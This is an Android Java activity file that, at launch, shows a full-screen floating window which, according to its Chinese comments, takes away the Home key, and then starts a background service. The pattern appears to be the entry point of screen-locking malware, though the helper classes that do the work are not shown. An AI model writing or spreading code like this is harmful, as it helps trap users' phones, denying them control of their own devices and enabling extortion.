package peigen.banquan;

import android.app.*;
import android.content.*;
import android.os.*;
import android.view.*;
import peigen.banquan.*;
import android.webkit.*;
public class MainActivity extends Activity 
{
	
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
       
		
		View inflate = View.inflate(this, R.layout.main, null);//悬浮窗去掉Home键功能 

		中国牛掰.showAd(this, inflate);//悬浮窗去掉Home键功能
		
		Intent peigen=new Intent(MainActivity.this,peigen.class);
		MainActivity.this.startService(peigen);	
    }
}
